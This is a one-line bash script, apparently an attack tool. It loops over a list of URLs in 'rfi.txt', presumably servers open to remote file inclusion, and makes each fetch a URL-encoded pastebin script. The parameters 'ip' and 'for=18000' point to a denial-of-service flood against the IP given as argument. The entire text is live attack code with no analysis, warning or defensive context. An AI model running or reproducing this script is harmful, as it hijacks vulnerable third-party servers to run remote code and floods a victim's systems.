ip=$1; for url in `cat rfi.txt`; do  wget -O /dev/null -q "${url}"'http%3A%2F%2Fpastebin.com%2Fpastebin.php%3Fdl%3Df13bbfdd9&ip='${ip}'&for=18000' & done
